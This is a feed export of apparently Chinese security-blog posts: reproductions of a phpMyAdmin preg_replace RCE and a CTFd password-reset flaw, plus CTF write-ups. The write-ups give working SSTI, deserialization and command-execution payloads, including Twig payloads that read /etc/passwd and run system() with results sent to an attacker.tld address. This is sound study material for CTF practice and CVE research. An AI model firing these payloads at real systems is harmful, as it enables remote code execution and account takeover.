        <content type="html"><![CDATA[<h1 id="phpmyadmin登陆后rce"><a href="#phpmyadmin登陆后rce" class="headerlink" title="phpmyadmin登陆后rce"></a>phpmyadmin登陆后rce</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><blockquote><p>在PHP5.4.7以前，<code>preg_replace</code>的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p><p>以下版本受到影响：</p><ul><li>4.0.10.16之前4.0.x版本</li><li>4.4.15.7之前4.4.x版本</li><li>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</li></ul></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>全局搜索preg_replace,发现以下可能有可控变量的位置:</p><p>容易找到</p><p><code>TableSearch.lib.php</code></p><pre><code class="php">function _getRegexReplaceRows($columnIndex, $find, $replaceWith, $charSet)    {        $column = $this-&gt;_columnNames[$columnIndex];        $sql_query = &quot;SELECT &quot;            . PMA_Util::backquote($column) . &quot;,&quot;            . &quot; 1,&quot; // to add an extra column that will have replaced value            . &quot; COUNT(*)&quot;            . &quot; FROM &quot; . PMA_Util::backquote($this-&gt;_db)            . &quot;.&quot; . PMA_Util::backquote($this-&gt;_table)            . &quot; WHERE &quot; . PMA_Util::backquote($column)            . &quot; RLIKE &#39;&quot; . PMA_Util::sqlAddSlashes($find) . &quot;&#39; COLLATE &quot;            . $charSet . &quot;_bin&quot;; // here we            // change the collation of the 2nd operand to a case sensitive            // binary collation to make sure that the comparison is case sensitive        $sql_query .= &quot; GROUP BY &quot; . PMA_Util::backquote($column)            . &quot; ORDER BY &quot; . PMA_Util::backquote($column) . &quot; ASC&quot;;        $result = $GLOBALS[&#39;dbi&#39;]-&gt;fetchResult($sql_query, 0);        if (is_array($result)) {            foreach ($result as $index=&gt;$row) {                $result[$index][1] = preg_replace(                    &quot;/&quot; . $find . &quot;/&quot;,                    $replaceWith,                    $row[0]                );            }        }        return $result;    }</code></pre><p>如果我们可以控制<code>$result和$replaceWith</code>那么我们就可以执行任意命令</p><p><img src="https://i.loli.net/2020/04/03/qo5ZbfuJHKA9d6m.png" alt="image1674"></p><p>我们先看<code>getReplacePreview</code></p><p><img src="https://i.loli.net/2020/04/03/vnk9IZUxJ5YoMbW.png" alt="image1764"></p><p>再查看调用<code>getReplacePreview</code>的函数</p><p><img src="https://i.loli.net/2020/04/03/JxKS1TioFz4w7ql.png" alt="image1858"></p><p>去看第二个和第三个明显不行,这里就不贴出来了</p><p>再跟进<code>tbl_find_replace.php</code></p><pre><code class="php">if (isset($_POST[&#39;find&#39;])) {    $preview = $table_search-&gt;getReplacePreview(        $_POST[&#39;columnIndex&#39;],        $_POST[&#39;find&#39;],        $_POST[&#39;replaceWith&#39;],        $_POST[&#39;useRegex&#39;],        $connectionCharSet    );    $response-&gt;addJSON(&#39;preview&#39;, $preview);    exit;}</code></pre><p>明显白给</p><p>我们再回到<code>_getRegexReplaceRows</code>去查看它的第二个调用函数</p><p><img src="https://i.loli.net/2020/04/03/OhCPcviVT8tm6ZK.png" alt="image2318"></p><p>再查看调用replace的函数</p><p><img src="https://i.loli.net/2020/04/03/zT21ymqOYvUf5WE.png" alt="image2400"></p><p>同样后面两个还是不行</p><p>在跟进<code>tbl_find_replace.php</code></p><p><img src="https://i.loli.net/2020/04/03/j4JdNfKa8up2BCc.png" alt="image2504"></p><p>还是白给,两个调用链都是可以rce的,我们以前面那个为例</p><p>先往表中添加一条数据<code>INSERT INTO</code>flags<code>(</code>username<code>,</code>flag<code>,</code>msgid<code>) VALUES (UNHEX(&#39;302F6500&#39;),1,1);</code></p><p>直接抓包,修改</p><p><img src="https://i.loli.net/2020/04/03/FwSzMuNI4nDadBh.png" alt="image2701"></p><p><img src="https://i.loli.net/2020/04/03/QZE5fMTnUhPXdqV.png" alt="image2768"></p><p>成功</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>这个poc直接抄个别人的,懒得写了</p><p><code>https://www.exploit-db.com/exploits/40185</code></p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/03/phpmyadmin_登陆后_rce/">https://www.ccreater.top/2020/04/03/phpmyadmin_登陆后_rce/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFd任意密码重置复现</title>
      <link href="2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/04/01/CTFd%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFd任意密码重置复现"><a href="#CTFd任意密码重置复现" class="headerlink" title="CTFd任意密码重置复现"></a>CTFd任意密码重置复现</h1><p>今天刚好做到一题CTFd的就顺便复现下</p><p>这是补丁的信息:<code>Strip spaces on registration and refine password reset</code></p><p>根据补丁信息去找register的代码</p><pre><code class="python">def register():    errors = get_errors()    if request.method == &quot;POST&quot;:        name = request.form[&quot;name&quot;]        email_address = request.form[&quot;email&quot;]        password = request.form[&quot;password&quot;]        name_len = len(name) == 0        names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first()        emails = (            Users.query.add_columns(&quot;email&quot;, &quot;id&quot;)            .filter_by(email=email_address)            .first()        )        pass_short = len(password.strip()) == 0        pass_long = len(password) &gt; 128        valid_email = validators.validate_email(request.form[&quot;email&quot;])        team_name_email_check = validators.validate_email(name)        if not valid_email:            errors.append(&quot;Please enter a valid email address&quot;)        if email.check_email_is_whitelisted(email_address) is False:            errors.append(                &quot;Only email addresses under {domains} may register&quot;.format(                    domains=get_config(&quot;domain_whitelist&quot;)                )            )        if names:            errors.append(&quot;That user name is already taken&quot;)        if team_name_email_check is True:            errors.append(&quot;Your user name cannot be an email address&quot;)        if emails:            errors.append(&quot;That email has already been used&quot;)        if pass_short:            errors.append(&quot;Pick a longer password&quot;)        if pass_long:            errors.append(&quot;Pick a shorter password&quot;)        if name_len:            errors.append(&quot;Pick a longer user name&quot;)        if len(errors) &gt; 0:            return render_template(                &quot;register.html&quot;,                errors=errors,                name=request.form[&quot;name&quot;],                email=request.form[&quot;email&quot;],                password=request.form[&quot;password&quot;],            )        else:            with app.app_context():                user = Users(                    name=name.strip(),                    email=email_address.lower(),                    password=password.strip(),                )                db.session.add(user)                db.session.commit()                db.session.flush()                login_user(user)                if config.can_send_mail() and get_config(                    &quot;verify_emails&quot;                ):  # Confirming users is enabled and we can send email.                    log(                        &quot;registrations&quot;,                        format=&quot;[{date}] {ip} - {name} registered (UNCONFIRMED) with {email}&quot;,                    )                    email.verify_email_address(user.email)                    db.session.close()                    return redirect(url_for(&quot;auth.confirm&quot;))                else:  # Don&#39;t care about confirming users                    if (                        config.can_send_mail()                    ):  # We want to notify the user that they have registered.                        email.sendmail(                            request.form[&quot;email&quot;],                            &quot;You&#39;ve successfully registered for {}&quot;.format(                                get_config(&quot;ctf_name&quot;)                            ),                        )        log(&quot;registrations&quot;, &quot;[{date}] {ip} - {name} registered with {email}&quot;)        db.session.close()        if is_teams_mode():            return redirect(url_for(&quot;teams.private&quot;))        return redirect(url_for(&quot;challenges.listing&quot;))    else:        return render_template(&quot;register.html&quot;, errors=errors)</code></pre><p>阅读代码发现,查询用户名是否重复是直接将我们的输入拿去查询</p><pre><code class="python">        name = request.form[&quot;name&quot;]        email_address = request.form[&quot;email&quot;]        password = request.form[&quot;password&quot;]        name_len = len(name) == 0        names = Users.query.add_columns(&quot;name&quot;, &quot;id&quot;).filter_by(name=name).first()#这里这里        emails = (            Users.query.add_columns(&quot;email&quot;, &quot;id&quot;)            .filter_by(email=email_address)            .first()        )        if names:            errors.append(&quot;That user name is already taken&quot;)</code></pre><p>而验证没有重复后,则将我们输入的用户名strip后,在添加到数据库,也就是说我们可以在数据库弄多个同名账号</p><pre><code class="python">            user = Users(                    name=name.strip(),                    email=email_address.lower(),                    password=password.strip(),                )</code></pre><p>CTFd重置密码会收到这样的email</p><pre><code>Did you initiate a password reset? Click the following link to reset your password:http://f04e02df-7759-45ba-a2b2-b89399e91ca0.node3.buuoj.cn/reset_password/ImFkbWluIg.XoRn7w.CDy8yi95cLlHsZN_YRiCp9Z-mX4</code></pre><p>我们去找<code>/reset_password/&lt;xxx&gt;</code>的路由</p><pre><code class="python">@auth.route(&quot;/reset_password&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])@auth.route(&quot;/reset_password/&lt;data&gt;&quot;, methods=[&quot;POST&quot;, &quot;GET&quot;])@ratelimit(method=&quot;POST&quot;, limit=10, interval=60)def reset_password(data=None):    if data is not None:        try:            name = unserialize(data, max_age=1800)        except (BadTimeSignature, SignatureExpired):            return render_template(                &quot;reset_password.html&quot;, errors=[&quot;Your link has expired&quot;]            )        except (BadSignature, TypeError, base64.binascii.Error):            return render_template(                &quot;reset_password.html&quot;, errors=[&quot;Your reset token is invalid&quot;]            )        if request.method == &quot;GET&quot;:            return render_template(&quot;reset_password.html&quot;, mode=&quot;set&quot;)        if request.method == &quot;POST&quot;:            user = Users.query.filter_by(name=name).first_or_404()            user.password = request.form[&quot;password&quot;].strip()            db.session.commit()            log(                &quot;logins&quot;,                format=&quot;[{date}] {ip} -  successful password reset for {name}&quot;,                name=name,            )            db.session.close()            return redirect(url_for(&quot;auth.login&quot;))</code></pre><p>我们发现,重置密码是根据用户名查出的第一个记录进行修改<code>user = Users.query.filter_by(name=name).first_or_404()</code></p><p>这样我们就成功覆盖了之前真实用户的密码而不是我们创建的用户</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/01/CTFd任意密码重置复现/">https://www.ccreater.top/2020/04/01/CTFd任意密码重置复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3月做题</title>
      <link href="2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/"/>
      <url>2020/04/01/3%E6%9C%88%E5%81%9A%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="3月做题"><a href="#3月做题" class="headerlink" title="3月做题"></a>3月做题</h1><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><pre><code class="php">&lt;?php$function = @$_GET[&#39;f&#39;];function filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}if($_SESSION){    unset($_SESSION);}$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function){    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;}if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;){    highlight_file(&#39;index.php&#39;);}else if($function == &#39;phpinfo&#39;){    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!}else if($function == &#39;show_image&#39;){    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));}</code></pre><pre><code class="php">function filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}extract($_POST);$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);$serialize_info = filter(serialize($_SESSION));$userinfo = unserialize($serialize_info);echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</code></pre><p>我们利用filter来吞掉一些字符,从而让我们任意反序列化</p><p><code>POST: _SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:12:&quot;aW5kZXgucGhw&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></p><p>我们分析一下为什么是这个payload:</p><p>…</p><p>在phpinfo中找到</p><table><thead><tr><th>config</th><th>Local Value</th><th>Mastr Value</th></tr></thead><tbody><tr><td>auto_append_file</td><td>d0g3_f1ag.php</td><td>d0g3_f1ag.php</td></tr></tbody></table><pre><code>_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}_SESSION[abc]=flagflagphpphpphp&amp;_SESSION[aaa]=;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;}</code></pre><pre><code class="php">&lt;?php$flag = &#39;flag in /d0g3_fllllllag&#39;;?&gt;</code></pre><p><code>flag{62b16099-c29d-499a-9dde-e54bf2985b31}</code></p><h2 id="easymd5"><a href="#easymd5" class="headerlink" title="easymd5"></a>easymd5</h2><pre><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p>md5($var,true)会返回一个原始的二进制数据，某些数据会被当成字符串</p><blockquote><p>raw MD5 hashes are dangerous in SQL statements because they can contain characters with special meaning to MySQL(原始值会包含mysql中的特殊字符，因此很危险）。</p></blockquote><p>   特殊字符串:</p><blockquote><p>129581926211651571912466741651878684928<br>ffifdyop</p></blockquote><h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#39;yds&#39;;foreach($_POST as $x =&gt; $y){    $$x = $y;}foreach($_GET as $x =&gt; $y){    $$x = $$y;}#$x=handsome $y=flagforeach($_GET as $x =&gt; $y){    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){        exit($handsome);    }}if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){    exit($yds);}if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){    exit($is);}echo &quot;the flag is: &quot;.$flag;</code></pre><p><code>/index.php?yds=flag</code></p><h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>根据题目的提示,修改xff头,发现可以修改ip,但是修改成127.0.0.1后没有啥东西</p><p>后来在fuzz的过程中发现,有ssti漏洞</p><pre><code>GET /flag.php HTTP/1.1Host: node3.buuoj.cn:27223Upgrade-Insecure-Requests: 1X-Forwarded-For: {system(&#39;cat /flag&#39;)}User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://node3.buuoj.cn:27223/Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; JSESSIONID=0740A2433DEA975EE0C0C0CC0D0257D0Connection: close</code></pre><h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><pre><code class="php">&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;)){    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file)){        die(&quot;Not now!&quot;);    }    include($file);  //next.php}else{    highlight_file(__FILE__);}?&gt;</code></pre><pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?text=data://text/plain,I%20have%20a%20dream&amp;file=next.php</code></pre><p>next.php</p><pre><code class="php">&lt;?php$id = $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] = $id;function complex($re, $str) {    return preg_replace(        &#39;/(&#39; . $re . &#39;)/ei&#39;,        &#39;strtolower(&quot;\\1&quot;)&#39;,        $str    );}foreach($_GET as $re =&gt; $str) {    echo complex($re, $str). &quot;\n&quot;;}function getFlag(){    @eval($_GET[&#39;cmd&#39;]);}</code></pre><pre><code>http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?&amp;\D*=${getFlag()}&amp;file=next.php&amp;text=data://,I%20have%20a%20dream&amp;cmd=system(%27cat%20/flag%27);</code></pre><h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>根据提示发现</p><pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user=admin</code></pre><p>fuzz过程中猜测是ssti</p><p><img src="https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png" alt="image4749"></p><p>检测出是twig</p><pre><code>Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre><h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>在index.php.swp中找到源码</p><pre><code class="php">&lt;?php    ob_start();    function get_hash(){        $chars = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;        $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times        $content = uniqid().$random;        return sha1($content);     }    header(&quot;Content-Type: text/html;charset=utf-8&quot;);    ***    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] != &#39;&#39; )    {        $admin = &#39;6d0bc1&#39;;        if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) {            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;/script&gt;&quot;;            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);            $text = &#39;            ***            ***            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;/h1&gt;            ***            ***&#39;;            fwrite($shtml,$text);            fclose($shtml);            ***            echo &quot;[!] Header  error ...&quot;;        } else {            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;/script&gt;&quot;;    }else    {    ***    }    ***?&gt;</code></pre><p>爆破得到密码,</p><p>因为将用户名插入到了shtml,造成ssi rce</p><p> <a href="https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2020/04/01/3月做题/">https://www.ccreater.top/2020/04/01/3月做题/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 做题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>volgactf</title>
      <link href="2020/03/30/volgactf/"/>
      <url>2020/03/30/volgactf/</url>
      
        <content type="html"><![CDATA[<h1 id="volgactf"><a href="#volgactf" class="headerlink" title="volgactf"></a>volgactf</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Newsletter"><a href="#Newsletter" class="headerlink" title="Newsletter"></a>Newsletter</h3><p>源码</p><pre><code class="php">&lt;?phpnamespace App\Controller;use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;use Symfony\Component\HttpFoundation\Response;use Symfony\Component\HttpFoundation\Request;use Symfony\Component\Mailer\MailerInterface;use Symfony\Component\Mime\Email;class MainController extends AbstractController{    public function index(Request $request)    {      return $this-&gt;render(&#39;main.twig&#39;);    }    public function subscribe(Request $request, MailerInterface $mailer)    {      $msg = &#39;&#39;;      $email = filter_var($request-&gt;request-&gt;get(&#39;email&#39;, &#39;&#39;), FILTER_VALIDATE_EMAIL);      if($email !== FALSE) {        $name = substr($email, 0, strpos($email, &#39;@&#39;));        $content = $this-&gt;get(&#39;twig&#39;)-&gt;createTemplate(          &quot;&lt;p&gt;Hello ${name}.&lt;/p&gt;&lt;p&gt;Thank you for subscribing to our newsletter.&lt;/p&gt;&lt;p&gt;Regards, VolgaCTF Team&lt;/p&gt;&quot;        )-&gt;render();###这里        $mail = (new Email())-&gt;from(&#39;newsletter@newsletter.q.2020.volgactf.ru&#39;)-&gt;to($email)-&gt;subject(&#39;VolgaCTF Newsletter&#39;)-&gt;html($content);        $mailer-&gt;send($mail);        $msg = &#39;Success&#39;;      } else {        $msg = &#39;Invalid email&#39;;      }      return $this-&gt;render(&#39;main.twig&#39;, [&#39;msg&#39; =&gt; $msg]);    }    public function source()    {        return new Response(&#39;&lt;pre&gt;&#39;.htmlspecialchars(file_get_contents(__FILE__)).&#39;&lt;/pre&gt;&#39;);    }}</code></pre><p>我们很容易知道这里存在ssti,但是有两个问题:</p><ol><li>FILTER_VALIDATE_EMAIL验证</li><li>如何接收结果</li></ol><p>第二个问题不难解决,直接用自己的vps接受就可以,第一个问题通过查询维基百科也可以构造出payload,但是payload却有长度限制,最多只能有64个字符,通常的twig ssti的payload是无法直接用的了,需要我们自己挖掘</p><p><a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly" target="_blank" rel="noopener">https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly</a><br><a href="https://en.wikipedia.org/wiki/Email_address" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Email_address</a></p><p><code>python -m smtpd -n -c DebuggingServer 0.0.0.0:25</code></p><p>以下是我挖掘发现的payload,最后还是没能做出来,原因是自己查询的版本和题目的版本不一样</p><pre><code class="php">&quot;{{app.request}}&quot;@ccreater.top&quot;{{app.environment}}&quot;%40ccreater.top  : prod&quot;{{app.request.request.get('name')}}&quot;@[47.107.171.219]email=&quot;{{render(controller(app.request.request.get('a')))}}&quot;@ccreater.top&amp;a=App\Controller\MainController::source&quot;{{render(controller(app.request.query.get(1),{'file':'flag'}))}}&quot;@ccreater.top 1=Symfony\Bundle\FrameworkBundle\Controller::file文件名最长只能4个,并没有读到flag</code></pre><p>以下是wp提供的payload</p><p><a href="https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt" target="_blank" rel="noopener">https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt</a></p><pre><code>email=&quot;{{'/etc/passwd'|file_excerpt(1,30)}}&quot;@attacker.tldPOST /subscribe?0=cat+/etc/passwd HTTP/1.1Host: newsletter.q.2020.volgactf.ruContent-Type: application/x-www-form-urlencodedemail=&quot;{{app.request.query.filter(0,0,1024,{'options':'system'})}}&quot;@attacker.tld</code></pre><p><a href="https://twig.symfony.com/doc/3.x/functions/constant.html" target="_blank" rel="noopener">https://twig.symfony.com/doc/3.x/functions/constant.html</a><br>VolgaCTF_6751602deea2a308ab611eeef7a4e961<br><a href="https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html?m=1" target="_blank" rel="noopener">https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html?m=1</a></p><p>其中有一个filter_var来命令执行实在是让我惊讶</p><h3 id="NetCorp"><a href="#NetCorp" class="headerlink" title="NetCorp"></a>NetCorp</h3><p>这题挺简单的,但是我还是搞了好久,对jsp和题目的cve一点都不熟悉,搞得我写个payload都百度半天</p><p>端口扫描发现:</p><pre><code>8009/tcp open     ajp139090/tcp open     zeus-admin</code></pre><p>tomcat ajp前段时间刚好出了个文件读取/包含的漏洞</p><p>试了一下,确实存在这个洞</p><p>先读取/WEB-INF/web.xml</p><pre><code class="xml">&lt;!DOCTYPE web-app PUBLIC &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot; &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;&lt;web-app&gt;  &lt;display-name&gt;NetCorp&lt;/display-name&gt;  &lt;servlet&gt;        &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;        &lt;display-name&gt;ServeScreenshot&lt;/display-name&gt;        &lt;servlet-class&gt;ru.volgactf.netcorp.ServeScreenshotServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;        &lt;servlet-name&gt;ServeScreenshot&lt;/servlet-name&gt;        &lt;url-pattern&gt;/ServeScreenshot&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;        &lt;servlet&gt;                &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;                &lt;display-name&gt;ServeComplaint&lt;/display-name&gt;                &lt;description&gt;Complaint info&lt;/description&gt;                &lt;servlet-class&gt;ru.volgactf.netcorp.ServeComplaintServlet&lt;/servlet-class&gt;        &lt;/servlet&gt;        &lt;servlet-mapping&gt;                &lt;servlet-name&gt;ServeComplaint&lt;/servlet-name&gt;                &lt;url-pattern&gt;/ServeComplaint&lt;/url-pattern&gt;        &lt;/servlet-mapping&gt;        &lt;error-page&gt;                &lt;error-code&gt;404&lt;/error-code&gt;                &lt;location&gt;/404.html&lt;/location&gt;        &lt;/error-page&gt;&lt;/web-app&gt;</code></pre><p>再读取其他的class文件,其中发现一个上传点</p><pre><code class="java">package ru.volgactf.netcorp;import java.io.*;import java.math.BigInteger;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;import java.util.Collection;import java.util.Iterator;import javax.servlet.*;import javax.servlet.http.*;public class ServeScreenshotServlet extends HttpServlet{    public ServeScreenshotServlet()    {        System.out.println(&quot;ServeScreenshotServlet Constructor called!&quot;);    }    public void init(ServletConfig config)        throws ServletException    {        System.out.println(&quot;ServeScreenshotServlet \&quot;Init\&quot; method called&quot;);    }    public void destroy()    {        System.out.println(&quot;ServeScreenshotServlet \&quot;Destroy\&quot; method called&quot;);    }    protected void doPost(HttpServletRequest request, HttpServletResponse response)        throws ServletException, IOException    {        String appPath = request.getServletContext().getRealPath(&quot;&quot;);        String savePath = (new StringBuilder()).append(appPath).append(&quot;uploads&quot;).toString();        File fileSaveDir = new File(savePath);        if(!fileSaveDir.exists())            fileSaveDir.mkdir();        String submut = request.getParameter(&quot;submit&quot;);        if(submut != null)            if(submut.equals(&quot;true&quot;));        PrintWriter out = request.getParts().iterator();        do        {            if(!out.hasNext())                break;            Part part = (Part)out.next();            String fileName = extractFileName(part);            fileName = (new File(fileName)).getName();            String hashedFileName = generateFileName(fileName);            String path = (new StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString();            if(!path.equals(&quot;Error&quot;))                part.write(path);        } while(true);        out = response.getWriter();        response.setContentType(&quot;application/json&quot;);        response.setCharacterEncoding(&quot;UTF-8&quot;);        out.print(String.format(&quot;{&#39;success&#39;:&#39;%s&#39;}&quot;, new Object[] {            &quot;true&quot;        }));        out.flush();    }    private String generateFileName(String fileName)    {        String s2;        StringBuilder sb;        MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;);        md.update(fileName.getBytes());        byte digest[] = md.digest();        s2 = (new BigInteger(1, digest)).toString(16);        sb = new StringBuilder(32);        int i = 0;        for(int count = 32 - s2.length(); i &lt; count; i++)            sb.append(&quot;0&quot;);        return sb.append(s2).toString();        NoSuchAlgorithmException e;        e;        e.printStackTrace();        return &quot;Error&quot;;    }    private String extractFileName(Part part)    {        String contentDisp = part.getHeader(&quot;content-disposition&quot;);        String items[] = contentDisp.split(&quot;;&quot;);        String as[] = items;        int i = as.length;        for(int j = 0; j &lt; i; j++)        {            String s = as[j];            if(s.trim().startsWith(&quot;filename&quot;))                return s.substring(s.indexOf(&quot;=&quot;) + 2, s.length() - 1);        }        return &quot;&quot;;    }    private static final String SAVE_DIR = &quot;uploads&quot;;}</code></pre><p>于是问题解决了</p><h3 id="Library"><a href="#Library" class="headerlink" title="Library"></a>Library</h3><p>这题有点意思,让我接触了一个新的查询语言 Graphql </p><p>先是通过报错获知了后端是nodejs,又通过报错得知了api是Graphql </p><p>[PayloadsAllTheThings GraphQL]( <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL" target="_blank" 